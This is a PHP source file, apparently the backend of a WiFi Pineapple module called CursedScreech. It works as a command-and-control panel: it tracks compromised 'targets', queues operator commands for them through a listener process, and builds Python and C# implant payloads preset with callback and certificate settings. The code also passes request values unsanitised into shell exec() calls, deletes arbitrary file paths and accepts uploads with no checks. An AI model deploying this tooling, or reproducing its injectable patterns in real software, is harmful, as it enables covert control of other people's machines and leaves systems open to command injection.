<?php

namespace pineapple;

// Root level includes
define('__INCLUDES__', "/pineapple/modules/CursedScreech/includes/");

// Define to hook into Papers' SSL store
define('__SSLSTORE__', "/pineapple/modules/Papers/includes/ssl/");

// Main directory defines
define('__FOREST__', __INCLUDES__ . 'forest/');
define('__SCRIPTS__', __INCLUDES__ . "scripts/");
define('__HELPFILES__', __INCLUDES__ . "help/");
define('__CHANGELOGS__', __INCLUDES__ . "changelog/");
define('__LOGS__', __INCLUDES__ . "errorlogs/");
define('__TARGETLOGS__', __FOREST__ . "targetlogs/");
define('__PAYLOADS__', __INCLUDES__ . "payloads/");

// API defines
define('__API_CS__', __INCLUDES__ . "api/cs/");
define('__API_PY__', __INCLUDES__ . "api/python/");
define('__API_DL__', __INCLUDES__ . "api/downloads/");

// File location defines
define('__ACTIVITYLOG__', __FOREST__ . 'activity.log');
define('__SETTINGS__', __FOREST__ . 'settings');
define('__TARGETS__', __FOREST__ . "targets.log");
define('__COMMANDLOG__', __FOREST__ . "cmd.log");
define('__EZCMDS__', __FOREST__ . "ezcmds");


/*
	Move the uploaded file to the payloads directory
*/
if (!empty($_FILES)) {
	$response = [];
	foreach ($_FILES as $file) {
		$tempPath = $file[ 'tmp_name' ];
		$name = pathinfo($file['name'], PATHINFO_FILENAME);
		$type = pathinfo($file['name'], PATHINFO_EXTENSION);
		
		// Ensure the upload directory exists
		if (!file_exists(__PAYLOADS__)) {
			if (!mkdir(__PAYLOADS__, 0755, true)) {
				$response[$name]['success'] = "Failed";
				$response[$name]['message'] = "Failed to create payloads directory";
				echo json_encode($response);
				die();
			}
		}
		
		$uploadPath = __PAYLOADS__ . $name . "." . $type;
		$res = move_uploaded_file($tempPath, $uploadPath);
		
		if ($res) {
			$response[$name]['success'] = "Success";
		} else {
			$response[$name]['success'] = "Failed";
			$response[$name]['message'] = "Failed to upload payload '" . $name . "." . $type . "'";
		}
	}
	echo json_encode($response);
	die();
}

class CursedScreech extends Module {
	public function route() {
		switch ($this->request->action) {
			case 'init':
				$this->init();
				break;
			case 'depends':
				$this->depends($this->request->task);
				break;
			case 'loadSettings':
				$this->loadSettings();
				break;
			case 'updateSettings':
				$this->updateSettings($this->request->settings);
				break;
			case 'readLog':
				$this->retrieveLog($this->request->logName, $this->request->type);
				break;
			case 'getLogs':
				$this->getLogs($this->request->type);
				break;
			case 'clearLog':
				$this->clearLog($this->request->logName, $this->request->type);
				break;
			case 'deleteLog':
				$this->deleteLog($this->request->logName, $this->request->type);
				break;
			case 'startProc':
				$this->startProc($this->request->procName);
				break;
			case 'procStatus':
				$this->procStatus($this->request->procName);
				break;
			case 'stopProc':
				$this->stopProc($this->request->procName);
				break;
			case 'loadCertificates':
				if (is_dir(__SSLSTORE__)) {
					$this->loadCertificates();
				} else {
					$this->respond(false, "Papers is not installed. Please enter a path to your keys manually.");
				}
				break;
			case 'loadTargets':
				$this->loadTargets();
				break;
			case 'deleteTarget':
				$this->deleteTarget($this->request->target);
				break;
			case 'sendCommand':
				$this->sendCommand($this->request->command, $this->request->targets);
				break;
			case 'downloadLog':
				$this->downloadLog($this->request->logName, $this->request->logType);
				break;
			case 'loadEZCmds':
				$this->loadEZCmds();
				break;
			case 'saveEZCmds':
				$this->saveEZCmds($this->request->ezcmds);
				break;
			case 'genPayload':
				$this->genPayload($this->request->type);
				break;
			case 'clearDownloads':
				$this->clearDownloads();
				break;
			case 'loadAvailableInterfaces':
				$this->loadAvailableInterfaces();
				break;
			case 'getPayloads':
				$this->getPayloads();
				break;
			case 'deletePayload':
				$this->deletePayload($this->request->filePath);
				break;
			case 'cfgUploadLimit':
				$this->cfgUploadLimit();
				break;
		}
	}
	
	/* ============================ */
	/*        INIT FUNCTIONS        */
	/* ============================ */
	
	private function init() {
		if (!file_exists(__LOGS__)) {
			if (!mkdir(__LOGS__, 0755, true)) {
				$this->respond(false, "Failed to create logs directory");
				return false;
			}
		}
		
		if (!file_exists(__API_DL__)) {
			if (!mkdir(__API_DL__, 0755, true)) {
				$this->logError("Failed init", "Failed to initialize because the API download directory structure could not be created.");
				$this->respond(false);
				return false;
			}
		}
		
		if (!file_exists(__TARGETLOGS__)) {
			if (!mkdir(__TARGETLOGS__, 0755, true)) {
				$this->logError("Failed init", "Failed to initialize because the targetlogs directory at '" . __TARGETLOGS__ . "' could not be created.");
				$this->respond(false);
				return false;
			}
		}
	}
	
	/* ============================ */
	/*      DEPENDS FUNCTIONS       */
	/* ============================ */
	
	private function depends($action) {
		$retData = array();
		
		if ($action == "install") {
			exec(__SCRIPTS__ . "installDepends.sh", $retData);
			if (implode(" ", $retData) == "Complete") {
				$this->respond(true);
				return true;
			} else {
				$this->respond(false);
				return false;
			}
		} else if ($action == "remove") {
			exec(__SCRIPTS__ . "removeDepends.sh");
			$this->respond(true);
			return true;
		} else if ($action == "check") {
			exec(__SCRIPTS__ . "checkDepends.sh", $retData);
			if (implode(" ", $retData) == "Installed") {
				$this->respond(true);
				return true;
			} else {
				$this->respond(false);
				return false;
			}
		}
	}
	
	/* ============================ */
	/*      SETTINGS FUNCTIONS      */
	/* ============================ */
	
	private function loadSettings(){
		$configs = array();
		$config_file = fopen(__SETTINGS__, "r");
		if ($config_file) {
			while (($line = fgets($config_file)) !== false) {
				$item = explode("=", $line);
				$key = $item[0]; $val = trim($item[1]);
				$configs[$key] = $val;
			}
		}
		fclose($config_file);
		$this->respond(true, null, $configs);
		return $configs;
	}
	
	private function updateSettings($settings) {
		// Load the current settings from file
		$configs = $this->loadSettings();
		
		// Update the current list.  We do it this way so only the requested
		// settings are updated. Probably not necessary but whatevs.
		foreach ($settings as $k => $v) {
			$configs["$k"] = $v;
		}

		// Get the serial number of the target's public cert
		$configs['client_serial'] = exec(__SCRIPTS__ . "getCertSerial.sh " . $configs['target_key'] . ".cer");
		$configs['kuro_serial'] = exec(__SCRIPTS__ . "getCertSerial.sh " . $configs['kuro_key'] . ".cer");
		
		// Get the IP address of the selected listening interface
		$configs['iface_ip'] = exec(__SCRIPTS__ . "getInterfaceIP.sh " . $configs['iface_name']);
		
		// Push the updated settings back out to the file
		$config_file = fopen(__SETTINGS__, "w");
		foreach ($configs as $k => $v) {
			fwrite($config_file, $k . "=" . $v . "\n");
		}
		fclose($config_file);
		
		$this->respond(true);
	}
	
	/* ============================ */
	/*       FOREST FUNCTIONS       */
	/* ============================ */
	
	private function startProc($procName) {
		if ($procName == "kuro.py") {
			file_put_contents(__ACTIVITYLOG__, "[+] Starting Kuro...\n", FILE_APPEND);
		}
		$cmd = "python " . __FOREST__ . $procName . " > /dev/null 2>&1 &";
		exec($cmd);
		
		// Check if the process is running and return it's PID
		if (($pid = $this->getPID($procName)) != "") {
			$this->respond(true, null, $pid);
			return $pid;
		} else {
			$this->logError("Failed_Process", "The following command failed to execute:<br /><br />" . $cmd);
			$this->respond(false);
			return false;
		}
	}
	
	private function procStatus($procName) {
		if (($status = $this->getPID($procName)) != "") {
			$this->respond(true, null, $status);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function stopProc($procName) {
		// Check if the process is running, if so grab it's PID
		if (($pid = $this->getPID($procName)) == "") {
			$this->respond(true);
			return true;
		}
		
		// Kuro requires a special bullet
		if ($procName == "kuro.py") {
			file_put_contents(__ACTIVITYLOG__, "[!] Stopping Kuro...\n", FILE_APPEND);
			exec("echo 'killyour:self' >> " . __COMMANDLOG__);
		} else {
			// Kill the process
			exec("kill " . $pid);
		}
		
		// Check one more time if it's still running
		if (($pid = $this->getPID($procName)) == "") {
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function getPID($procName) {
		$data = array();
		exec("pgrep -lf " . $procName, $data);
		$output = explode(" ", $data[0]);
		if (strpos($output[1], "python") !== False) {
			return $output[0];
		}
		return false;
	}
	
	private function loadTargets() {
		$targets = array();
		$fh = fopen(__TARGETS__, "r");
		if ($fh) {
			while (($line = fgets($fh)) !== False) {
				array_push($targets, rtrim($line, "\n"));
			}
		} else {
			$this->respond(false, "Failed to open " . __TARGETS__);
			return false;
		}
		fclose($fh);
		$this->respond(true, null, $targets);
		return $targets;
	}
	
	private function deleteTarget($target) {
		$targetFile = explode("\n", file_get_contents(__TARGETS__));
		$key = array_search($target, $targetFile, true);
		if ($key !== False) {
			unset($targetFile[$key]);
		}
		
		$fh = fopen(__TARGETS__, "w");
		fwrite($fh, implode("\n", $targetFile));
		fclose($fh);
		
		$this->respond(true);
		return true;
	}
	
	private function sendCommand($cmd, $targets) {
		if (count($targets) == 0) {
			$this->respond(false);
			return;
		}
		
		$output = "";
		foreach ($targets as $target) {
			$output .= $cmd . ":" . $target . "\n";
		}
		$fh = fopen(__COMMANDLOG__, "w");
		if ($fh) {
			fwrite($fh, $output);
			fclose($fh);
			$this->respond(true);
			return true;
		} else {
			$this->respond(false);
			return false;
		}
	}
	
	private function downloadLog($logName, $type) {
		$dir = ($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : "");
		if (file_exists($dir . $logName)) {
			$this->respond(true, null, $this->downloadFile($dir . $logName));
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function genPayload($type) {
		if ($type == "python") {
			$dir = __API_PY__;
			$payload = "payload.py";
			$api = "PineappleModules.py";
			$zip = "Python_Payload.zip";
		} else if ($type == "cs") {
			$dir = __API_CS__;
			$payload = "payload.cs";
			$api = "PineappleModules.cs";
			$zip = "CS_Payload.zip";
		} else if ($type == "cs_auth") {
			$dir = __API_CS__;
			$payload = "payloadAuth.cs";
			$api = "PineappleModules.cs";
			$zip = "CS_Auth_Payload.zip";
		} else {
			return null;
		}
		$template = "template/" . $payload;
		
		// Get the configs so we can push them to the payload template
		$configs = $this->loadSettings();
		
		// Copy the contents of the payload template and add our configs
		$contents = file_get_contents($dir . $template);
		$contents = str_replace("IPAddress", $configs['mcast_group'], $contents);
		$contents = str_replace("mcastport", $configs['mcast_port'], $contents);
		$contents = str_replace("hbinterval", $configs['hb_interval'], $contents);
		
		// The format of the serial number in the C# payload differs from that in the
		// Python payload.  Therefore, we need this check here.
		if ($type == "python") {
			$contents = str_replace("serial", $configs['kuro_serial'], $contents);
			$contents = str_replace("publicKey", end(explode("/", $configs['target_key'])) . ".cer", $contents);
			$contents = str_replace("kuroKey", end(explode("/", $configs['kuro_key'])) . ".cer", $contents);
			$contents = str_replace("privateKey", end(explode("/", $configs['target_key'])) . ".pem", $contents);
		} else {
			$contents = str_replace("serial", exec(__SCRIPTS__ . "bigToLittleEndian.sh " . $configs['kuro_serial']), $contents);
			
			// This part seems confusing but the fingerprint is returned from the script in the following format:
			// Fingerprint=AB:CD:EF:12:34:56:78:90
			// And the C# payload requires it to be in the following format: ABCDEF1234567890
			// Therefore we explode the returned data into an array, keep only the second element, then run a str_replace on all ':' characters
			
			$ret = exec(__SCRIPTS__ . "getFingerprint.sh " . $configs['kuro_key'] . ".cer");
			$fingerprint = implode("", explode(":", explode("=", $ret)[1]));
			$contents = str_replace("fingerprint", $fingerprint, $contents);
			$contents = str_replace("privateKey", "Payload." . end(explode("/", $configs['target_key'])) . ".pfx", $contents);
		}
		
		// Write the changes to the payload file
		$fh = fopen($dir . $payload, "w");
		fwrite($fh, $contents);
		fclose($fh);
		
		// Archive the directory
		$files = implode(" ", array($payload, $api, "Documentation.pdf"));
		
		// Command: ./packPayload.sh $dir -o $zip -f $files
		exec(__SCRIPTS__ . "packPayload.sh " . $dir . " -o " . $zip . " -f \"" . $files . "\"");
		
		// Check if a file exists in the downloads directory
		if (count(scandir(__API_DL__)) > 2) {
			$this->respond(true, null, $this->downloadFile(__API_DL__ . $zip));
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function clearDownloads() {
		$files = scandir(__API_DL__);
		$success = true;
		foreach ($files as $file) {
			if (substr($file, 0, 1) == ".") {continue;}
			if (!unlink(__API_DL__ . $file)) {
				$success = false;
			}
		}
		$this->respond($success);
		return $success;
	}
	
	private function loadAvailableInterfaces() {
		$data = array();
		exec(__SCRIPTS__ . "getListeningInterfaces.sh", $data);
		if ($data == NULL) {
			$this->logError("Load_Interfaces_Error", "Failed to load available interfaces for 'Listening Interface' dropdown.  Either the getListneingInterfaces.sh script failed or none of your interfaces have an IP address associated with them.");
			$this->respond(false);
		}
		$this->respond(true, null, $data);
	}
	
	//=========================//
	//    PAYLOAD FUNCTIONS    //
	//=========================//
	
	private function getPayloads() {
		$files = [];
		
		foreach (scandir(__PAYLOADS__) as $file) {
			if (substr($file, 0, 1) == ".") {continue;}
			$files[$file] = __PAYLOADS__;
		}
		$this->respond(true, null, $files);
		return $files;
	}
	
	private function deletePayload($filePath) {
		if (!unlink($filePath)) {
			$this->logError("Delete Payload", "Failed to delete payload at path " . $filePath);
			$this->respond(false);
			return false;
		}
		$this->respond(true);
		return true;
	}
	
	private function cfgUploadLimit() {
		$data = array();
		$res = exec("python " . __SCRIPTS__ . "cfgUploadLimit.py > /dev/null 2>&1 &", $data);
		if ($res != "") {
			$this->logError("cfg_upload_limit_error", $data);
			$this->respond(false);
			return false;
		}
		$this->respond(true);
		return true;
	}
	
	/* ============================ */
	/*        EZ CMD FUNCTIONS      */
	/* ============================ */
	
	private function loadEZCmds() {
		$contents = explode("\n", file_get_contents(__EZCMDS__));
		$cmdDict = array();
		foreach ($contents as $line) {
			$cmd = explode(":", $line, 2);
			$name = $cmd[0]; $action = $cmd[1];
			$cmdDict[$name] = $action;
		}
		$this->respond(true, null, $cmdDict);
		return $cmdDict;
	}
	
	private function saveEZCmds($cmds) {
		$fh = fopen(__EZCMDS__, "w");
		if (!$fh) {
			$this->respond(false);
			return false;
		}
		foreach ($cmds as $k => $v) {
			fwrite($fh, $k . ":" . $v . "\n");
		}
		fclose($fh);
	}
	
	/* ============================ */
	/*         MISCELLANEOUS        */
	/* ============================ */
	
	private function respond($success, $msg = null, $data = null, $error = null) {
		$this->response = array("success" => $success,"message" => $msg, "data" => $data, "error" => $error);
	}
	
	/* ============================ */
	/*         LOG FUNCTIONS        */
	/* ============================ */
	private function getLogs($type) {
		$dir = ($type == "error") ? __LOGS__ : (($type == "targets") ? __TARGETLOGS__ : __CHANGELOGS__);
		$contents = array();
		foreach (scandir($dir) as $log) {
			if (substr($log, 0, 1) == ".") {continue;}
			array_push($contents, $log);
		}
		$this->respond(true, null, $contents);
	}
	
	private function retrieveLog($logname, $type) {
		$dir = ($type == "error") ? __LOGS__ : (($type == "help") ? __HELPFILES__ : (($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : __CHANGELOGS__)));
		$data = file_get_contents($dir . $logname);
		if (!$data) {
			$this->respond(true, null, "");
			return;
		}
		$this->respond(true, null, $data);
	}
	
	private function clearLog($log,$type) {
		$dir = ($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : "");
		$fh = fopen($dir . $log, "w");
		fclose($fh);
		$this->respond(true);
	}
	
	private function deleteLog($logname, $type) {
		$dir = ($type == "error") ? __LOGS__ : (($type == "targets") ? __TARGETLOGS__ : __CHANGELOGS__);
		$res = unlink($dir . $logname);
		if (!$res) {
			$this->respond(false, "Failed to delete log.");
			return;
		}
		$this->respond(true);
	}
	
	private function logError($filename, $data) {
		$time = exec("date +'%H_%M_%S'");
		$fh = fopen(__LOGS__ . str_replace(" ","_",$filename) . "_" . $time . ".txt", "w+");
		fwrite($fh, $data);
		fclose($fh);
	}
	
	/* ===================================================== */
	/*         KEY FUNCTIONS TO INTERFACE WITH PAPERS        */
	/* ===================================================== */
	
	private function loadCertificates() {
		$certs = $this->getKeys(__SSLSTORE__);
		$this->respond(true,null,$certs);
	}
	
	private function getKeys($dir) {
		$keyType = "TLS/SSL";
		$keys = scandir($dir);
		$certs = array();
		foreach ($keys as $key) {
			if (substr($key, 0, 1) == ".") {continue;}

			$parts = explode(".", $key);
			$fname = $parts[0];
			$type = "." . $parts[1];

			// Check if the object name already exists in the array
			if ($this->objNameExistsInArray($fname, $certs)) {
				foreach ($certs as &$obj) {
					if ($obj->Name == $fname) {
						$obj->Type .= ", " . $type;
					}
				}
			} else {
				// Add a new object to the array
				$enc = ($this->keyIsEncrypted($fname)) ? "Yes" : "No";
				array_push($certs, (object)array('Name' => $fname, 'Type' => $type, 'Encrypted' => $enc, 'KeyType' => $keyType));
			}
		}
		return $certs;
	}
	
	private function objNameExistsInArray($name, $arr) {
		foreach ($arr as $x) {
			if ($x->Name == $name) {
				return True;
			}
		}
		return False;
	}
	
	private function keyIsEncrypted($keyName) {
		$data = array();
		$keyDir = __SSLSTORE__;
		exec(__SCRIPTS__ . "testEncrypt.sh -k " . $keyName . " -d " . $keyDir . " 2>&1", $data);
		if ($data[0] == "writing RSA key") {
			return false;
		} else if ($data[0] == "unable to load Private Key") {
			return true;
		}
	}
}
